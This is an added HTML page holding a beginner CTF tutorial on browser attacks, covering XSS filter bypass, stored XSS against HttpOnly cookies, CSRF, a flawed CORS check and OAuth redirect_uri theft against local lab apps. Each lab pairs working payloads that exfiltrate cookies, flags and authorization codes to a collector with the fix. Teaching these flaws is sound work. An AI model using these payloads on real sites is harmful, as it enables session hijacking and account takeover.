@@ -1,0 +1,291 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>The Browser as a Weapon | h5i web security tutorial</title><meta name="description" content="Make a victim's browser execute code, send authenticated requests, cross origins, and leak an OAuth authorization code.">
+<meta name="author" content="h5i-dev"><meta name="theme-color" content="#D21C1C">
+<meta name="color-scheme" content="dark"><meta name="robots" content="index, follow, max-image-preview:large">
+<link rel="canonical" href="https://h5i.dev/guides/browser-as-a-weapon/"><link rel="icon" type="image/png" href="/_static/logo.png">
+<meta property="og:type" content="article"><meta property="og:site_name" content="h5i">
+<meta property="og:title" content="The Browser as a Weapon | h5i web security tutorial"><meta property="og:description" content="Make a victim's browser execute code, send authenticated requests, cross origins, and leak an OAuth authorization code.">
+<meta property="og:url" content="https://h5i.dev/guides/browser-as-a-weapon/"><meta property="og:image" content="https://h5i.dev/_static/sandboxed-browser-ui.png">
+<meta property="og:image:alt" content="An h5i browser session: the page an AI agent is reading, beside the request log the engine wrote before any bytes moved"><meta property="og:locale" content="en_US">
+<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="The Browser as a Weapon | h5i web security tutorial">
+<meta name="twitter:description" content="Make a victim's browser execute code, send authenticated requests, cross origins, and leak an OAuth authorization code."><meta name="twitter:image" content="https://h5i.dev/_static/sandboxed-browser-ui.png">
+<meta name="twitter:image:alt" content="An h5i browser session: the page an AI agent is reading, beside the request log the engine wrote before any bytes moved">
+<script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "TechArticle",
+      "headline": "The Browser as a Weapon",
+      "description": "Make a victim's browser execute code, send authenticated requests, cross origins, and leak an OAuth authorization code.",
+      "author": {
+        "@type": "Organization",
+        "name": "h5i-dev"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "h5i"
+      },
+      "datePublished": "2026-09-15",
+      "dateModified": "2026-09-15",
+      "image": "https://h5i.dev/_static/sandboxed-browser-ui.png",
+      "inLanguage": "en",
+      "isPartOf": {
+        "@id": "https://h5i.dev/#website"
+      },
+      "mainEntityOfPage": "https://h5i.dev/guides/browser-as-a-weapon/"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://h5i.dev/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Guides",
+          "item": "https://h5i.dev/guides/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "The Browser as a Weapon",
+          "item": "https://h5i.dev/guides/browser-as-a-weapon/"
+        }
+      ]
+    }
+  ]
+}</script>
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Archivo:wght@700;800;900&amp;family=Space+Grotesk:wght@300;400;500;700&amp;family=Space+Mono:wght@400;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/_static/blog.css?v=20ea6351e0"><link rel="stylesheet" href="/_static/highlight.css?v=45984d5155">
+</head>
+<body><nav class="blog-nav">
+  <a class="nav-logo" href="/"><img src="/_static/logo.png" alt="h5i"><span>h5i</span></a>
+  <ul class="nav-links">
+    <li><a href="/features/">Features</a></li><li><a href="/guides/">Guides</a></li>
+    <li><a href="/manual/">Manual</a></li><li><a href="/blog/">Blog</a></li>
+    <li><a href="https://github.com/h5i-dev/h5i" class="nav-cta">GitHub &rarr;</a></li>
+  </ul>
+</nav><main class="article-wrap"><article class="post">
+<header><div class="post-eyebrow">Tutorial 06 / Browser &middot; 2026-09-15</div>
+<h1>The Browser as a Weapon</h1><p class="post-deck">A beginner-friendly CTF tutorial: make a victim’s browser execute code, send authenticated requests, cross origins, and leak an OAuth authorization code.</p>
+<div class="post-meta"><span>7 min read</span><span>XSS &middot; CSRF &middot; CORS &middot; OAuth &middot; Labs 20&ndash;24</span></div></header>
+<p><a href="/guides/injection-beyond-sql/">Injection Beyond SQL</a> followed input into server-side interpreters. Labs 20–24 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a> move the attack into a victim’s browser.</p>
+<p>The central idea is simple: we often do not need to steal a credential. If the victim’s browser already has it, we can sometimes make that browser perform the protected action for us.</p>
+<p>The labs run locally and include an automated victim browser. They require h5i to be available on <code>PATH</code>, or through <code>H5I</code>. Only use these techniques with explicit authorization.</p>
+<h2 id="lab-20-reflected-xss-past-a-filter">Lab 20: reflected XSS past a filter</h2>
+<p>Start the lab:</p>
+<pre><code class="language-bash">$ ./run.sh 20
+$ h5i browser open 'http://127.0.0.1:9200/' \
+  --session lab20 --new --capture
+</code></pre>
+<p>The search page reflects its <code>q</code> parameter but removes <code>&lt;script&gt;</code> tags. The filter performs only one replacement, so a nested tag survives its own transformation:</p>
+<pre><code class="language-text">&lt;scr&lt;script&gt;ipt&gt; ... &lt;/script&gt;
+</code></pre>
+<p>After the inner <code>&lt;script&gt;</code> is deleted, the remaining halves join into a new <code>&lt;script&gt;</code> tag.</p>
+<p>Create a unique collector ID and a payload that sends the admin cookie back:</p>
+<pre><code class="language-bash">$ ID=&quot;drop$$&quot;
+$ PAYLOAD=&quot;&lt;scr&lt;script&gt;ipt&gt;fetch('/collect?id=$ID&amp;c='+encodeURIComponent(document.cookie))&lt;/script&gt;&quot;
+</code></pre>
+<p>Confirm that the response really contains a script before asking the admin to visit it:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab20 --create \
+  --set path=/search --set &quot;query.q=$PAYLOAD&quot;
+</code></pre>
+<p>URL-encode the target and report it:</p>
+<pre><code class="language-bash">$ TARGET=&quot;http://127.0.0.1:9200/search?q=$(python3 -c \
+  'import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1]))' &quot;$PAYLOAD&quot;)&quot;
+
+$ h5i websec replay req_0 --session lab20 --create \
+  --set path=/report --set &quot;query.url=$TARGET&quot;
+</code></pre>
+<p>The admin bot visits the reported URL a few seconds later. Poll the collector until its row appears:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab20 --create \
+  --set path=/collected --set &quot;query.id=$ID&quot;
+</code></pre>
+<p>The body is <code>{"rows": ["session=adm_..."]}</code>. Copy that cookie value and replay the protected request with it:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab20 --create \
+  --set path=/admin/flag \
+  --set &quot;cookie.session=PASTE_ADMIN_COOKIE&quot;
+</code></pre>
+<p>The result contains <code>FLAG{reflected_xss_filter}</code>.</p>
+<p>The fix is contextual output encoding and a well-tested HTML sanitizer—not a string replacement for one spelling of one tag. A strict Content Security Policy adds defense in depth.</p>
+<h2 id="lab-21-stored-xss-against-an-httponly-cookie">Lab 21: stored XSS against an HttpOnly cookie</h2>
+<p>Start the board lab:</p>
+<pre><code class="language-bash">$ ./run.sh 21
+$ h5i browser open 'http://127.0.0.1:9210/' \
+  --session lab21 --new --capture
+</code></pre>
+<p>The moderator’s session cookie is <code>HttpOnly</code>, so JavaScript cannot read it through <code>document.cookie</code>. That protects the cookie from direct theft, but the browser still attaches it to same-origin requests.</p>
+<p>Instead of reading the credential, ask the application for the flag and exfiltrate the response:</p>
+<pre><code class="language-bash">$ ID=&quot;drop$$&quot;
+$ PAYLOAD=&quot;&lt;script&gt;fetch('/admin/api/flag').then(r=&gt;r.text()).then(t=&gt;fetch('/collect?id=$ID&amp;c='+encodeURIComponent(t)))&lt;/script&gt;&quot;
+
+$ h5i websec replay req_0 --session lab21 --create \
+  --set method=POST --set path=/api/comment \
+  --set header.Content-Type=application/json \
+  --set json.who=anon --set &quot;json.body=$PAYLOAD&quot; \
+  --set header.X-Board-Url=http://127.0.0.1:9210/board
+</code></pre>
+<p>When the moderator reviews the stored comment, the script runs with the board’s origin and the moderator’s session. Read the collector a few seconds later:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab21 --create \
+  --set path=/collected --set &quot;query.id=$ID&quot;
+</code></pre>
+<p>The row is the percent-encoded body of <code>/admin/api/flag</code>, and it contains <code>FLAG{stored_xss_httponly}</code>.</p>
+<p><code>HttpOnly</code> is valuable, but it does not stop XSS from acting as the victim. Preventing the injection remains essential.</p>
+<h2 id="lab-22-csrf-without-seeing-the-cookie">Lab 22: CSRF without seeing the cookie</h2>
+<p><strong>Cross-site request forgery</strong>, or <strong>CSRF</strong>, makes a victim’s browser send an authenticated request from an attacker-controlled page.</p>
+<p>Start the lab:</p>
+<pre><code class="language-bash">$ ./run.sh 22
+$ h5i browser open 'http://127.0.0.1:9220/' \
+  --session lab22 --new --capture
+</code></pre>
+<p>The recovery-email endpoint changes state through <code>GET</code> and requires no CSRF token. Host an attacker page on the lab’s second origin:</p>
+<pre><code class="language-html">&lt;img src=&quot;http://127.0.0.1:9220/account/recovery-email?email=attacker@evil.example&quot;&gt;
+</code></pre>
+<p>Publish it and ask the moderator bot to open it:</p>
+<pre><code class="language-bash">$ PAGE='&lt;html&gt;&lt;body&gt;&lt;img src=&quot;http://127.0.0.1:9220/account/recovery-email?email=attacker@evil.example&quot;&gt;&lt;/body&gt;&lt;/html&gt;'
+
+$ h5i websec replay req_0 --session lab22 --create \
+  --set method=POST --set path=/page \
+  --set header.Content-Type=application/json \
+  --set json.name=trap --set &quot;json.html=$PAGE&quot;
+
+$ h5i websec replay req_0 --session lab22 --create \
+  --set method=POST --set path=/report \
+  --set header.Content-Type=application/json \
+  --set json.url=http://127.0.0.1:9221/p/trap
+</code></pre>
+<p>The browser loads the image from port 9220 and attaches the moderator’s matching cookie. Request <code>/account/reset</code> to obtain <code>FLAG{csrf_no_token}</code>.</p>
+<p>State-changing operations should not use <code>GET</code>. Require an unpredictable CSRF token and validate <code>Origin</code> or <code>Referer</code>; use <code>SameSite</code> cookies as an additional barrier.</p>
+<h2 id="lab-23-a-cors-check-that-ignores-the-port">Lab 23: a CORS check that ignores the port</h2>
+<p>An <strong>origin</strong> consists of a scheme, host, and port. These are different origins:</p>
+<pre><code class="language-text">http://127.0.0.1:9230
+http://127.0.0.1:9231
+</code></pre>
+<p>Start the lab and test both an unrelated host and the attacker-controlled second port:</p>
+<pre><code class="language-bash">$ ./run.sh 23
+$ h5i browser open 'http://127.0.0.1:9230/' \
+  --session lab23 --new --capture
+
+$ h5i websec replay req_0 --session lab23 --create \
+  --set path=/api/me \
+  --set header.Origin=http://127.0.0.1:9231
+</code></pre>
+<p>The server reflects that origin in <code>Access-Control-Allow-Origin</code> and sets <code>Access-Control-Allow-Credentials: true</code>. Its allowlist is a prefix test against <code>http://127.0.0.1</code>, so it stops reading before the port and accepts every port on the machine.</p>
+<p>Publish a page on port 9231 that reads <code>/api/me</code> with the victim’s cookies, and report it the same way as in Lab 22:</p>
+<pre><code class="language-bash">$ ID=&quot;drop$$&quot;
+$ PAGE=&quot;&lt;html&gt;&lt;body&gt;&lt;script&gt;
+fetch('http://127.0.0.1:9230/api/me',{credentials:'include'})
+  .then(r=&gt;r.text())
+  .then(t=&gt;fetch('http://127.0.0.1:9230/collect?id=$ID&amp;c='+encodeURIComponent(t)))
+&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&quot;
+
+$ h5i websec replay req_0 --session lab23 --create \
+  --set method=POST --set path=/page \
+  --set header.Content-Type=application/json \
+  --set json.name=steal --set &quot;json.html=$PAGE&quot;
+
+$ h5i websec replay req_0 --session lab23 --create \
+  --set method=POST --set path=/report \
+  --set header.Content-Type=application/json \
+  --set json.url=http://127.0.0.1:9231/p/steal
+</code></pre>
+<p>A signed-in user opens it, the page reads the credentialed response because the server agreed to the wrong origin, and the collector receives it:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab23 --create \
+  --set path=/collected --set &quot;query.id=$ID&quot;
+</code></pre>
+<p>The row is the percent-encoded body of <code>/api/me</code>, and it contains <code>FLAG{cors_origin_check}</code>.</p>
+<p>CORS allowlists must compare parsed, normalized origins exactly. Never use prefix, suffix, substring, or hostname-only checks when credentials are allowed.</p>
+<h2 id="lab-24-oauth-redirect-validation-as-a-string-bug">Lab 24: OAuth redirect validation as a string bug</h2>
+<p>Start the SSO lab:</p>
+<pre><code class="language-bash">$ ./run.sh 24
+$ h5i browser open 'http://127.0.0.1:9240/' \
+  --session lab24 --new --capture
+</code></pre>
+<p>The <code>notes</code> client has one registered callback:</p>
+<pre><code class="language-text">http://127.0.0.1:9240/callback
+</code></pre>
+<p>The authorization server incorrectly checks only whether that text appears somewhere inside the supplied <code>redirect_uri</code>.</p>
+<p>Create an attacker callback where the registered URL appears inside a query parameter:</p>
+<pre><code class="language-text">http://127.0.0.1:9241/p/callback?next=http://127.0.0.1:9240/callback
+</code></pre>
+<p>URL-encode it and construct the authorization URL:</p>
+<pre><code class="language-bash">$ EVIL='http://127.0.0.1:9241/p/callback?next=http://127.0.0.1:9240/callback'
+$ ENCODED=$(python3 -c \
+  'import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1],safe=&quot;&quot;))' &quot;$EVIL&quot;)
+$ AUTH=&quot;http://127.0.0.1:9240/oauth/authorize?client_id=notes&amp;state=xyz&amp;redirect_uri=$ENCODED&quot;
+</code></pre>
+<p>Publish a callback page that records <code>location.search</code>, then send <code>$AUTH</code> to the signed-in victim through <code>/report</code>. The victim is redirected to the attacker page with an authorization code.</p>
+<pre><code class="language-bash">$ ID=&quot;drop$$&quot;
+$ PAGE=&quot;&lt;script&gt;fetch('http://127.0.0.1:9240/collect?id=$ID&amp;c='+encodeURIComponent(location.search))&lt;/script&gt;&quot;
+
+$ h5i websec replay req_0 --session lab24 --create \
+  --set method=POST --set path=/page \
+  --set header.Content-Type=application/json \
+  --set json.name=callback --set &quot;json.html=$PAGE&quot;
+
+$ h5i websec replay req_0 --session lab24 --create \
+  --set method=POST --set path=/report \
+  --set header.Content-Type=application/json \
+  --set &quot;json.url=$AUTH&quot;
+</code></pre>
+<p>Read the collector, extract the <code>code</code> parameter, and exchange it:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab24 --create \
+  --set path=/collected --set &quot;query.id=$ID&quot;
+</code></pre>
+<p>The row looks like <code>?next=http://127.0.0.1:9240/callback&amp;code=&lt;hex&gt;&amp;state=xyz</code>.</p>
+<pre><code class="language-bash">$ CODE='PASTE_AUTHORIZATION_CODE'
+$ h5i websec replay req_0 --session lab24 --create \
+  --set method=POST --set path=/oauth/token \
+  --set header.Content-Type=application/json \
+  --set &quot;json.code=$CODE&quot;
+$ TOKEN='PASTE_ACCESS_TOKEN'
+</code></pre>
+<p>Call <code>/api/profile</code> with the access token:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab24 --create \
+  --set path=/api/profile \
+  --set &quot;header.Authorization=Bearer $TOKEN&quot;
+</code></pre>
+<p>The profile contains <code>FLAG{oauth_redirect_uri}</code>.</p>
+<p>OAuth redirect URIs should be matched exactly after careful parsing. A registered URL appearing as a substring, subdomain, path fragment, or query value is not the registered destination.</p>
+<h2 id="the-shared-browser-security-model">The shared browser-security model</h2>
+<p>These labs used different standards, but the testing questions repeat:</p>
+<ol>
+<li>Can attacker-controlled text become executable HTML or JavaScript?</li>
+<li>If a cookie cannot be read, can the browser still act with it?</li>
+<li>Does a cross-origin check compare scheme, host, and port?</li>
+<li>Does a redirect rule validate a destination or merely search a string?</li>
+<li>What protected response can the victim’s browser read and send elsewhere?</li>
+</ol>
+<h2 id="summary">Summary</h2>
+<p>Reflected and stored XSS gave code the victim’s origin. CSRF used the victim’s cookie without reading it. A partial CORS check exposed a credentialed response, and substring validation redirected an OAuth code to the wrong origin.</p>
+<pre><code class="language-bash">$ for s in lab20 lab21 lab22 lab23 lab24; do
+    h5i browser close --session &quot;$s&quot;
+  done
+$ ./run.sh stop
+</code></pre>
+<p>In <a href="/guides/ssrf-and-file-attacks/">SSRF and File Attacks</a>, we will make the server itself the client and combine SSRF, path traversal, uploads, and local file inclusion.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/20-reflected-xss-filter">Lab 20: Reflected XSS</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/21-stored-xss-httponly">Lab 21: Stored XSS</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/22-csrf-no-token">Lab 22: CSRF</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/23-cors-origin-check">Lab 23: CORS</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/24-oauth-redirect-uri">Lab 24: OAuth redirect URI</a></li>
+</ul>
+
+<a class="next-up" href="/guides/ssrf-and-file-attacks/"><span class="label">Next in the series</span><h3>SSRF and File Attacks</h3><p>Make a server reach internal services, bypass URL filters, preserve encoded paths, overwrite security data, and turn a log file into code.</p></a>
+<div class="post-cta"><h3>Run the labs yourself</h3><p>42 deliberately vulnerable applications, one binary, no Docker and no accounts.</p>
+<div class="hero-actions"><a class="btn btn-primary" href="https://github.com/h5i-dev/h5i-tutorial">Open h5i-tutorial</a></div></div>
+</article></main><footer class="blog-footer"><div class="blog-footer-inner">
+  <div class="brand">h5i<span class="red"> / high-five</span></div>
+  <nav class="links"><a href="/">Home</a><a href="/guides/">Guides</a><a href="/blog/">Blog</a><a href="/manual/">Manual</a><a href="https://github.com/h5i-dev/h5i">GitHub</a></nav>
+  <div class="legal">Apache 2.0 &middot; Built with Rust</div>
+</div></footer>
+<script src="/_static/blog.js?v=41dbda103a" defer></script><script src="/_static/highlight.js?v=ed81eee4e6" defer></script></body></html>
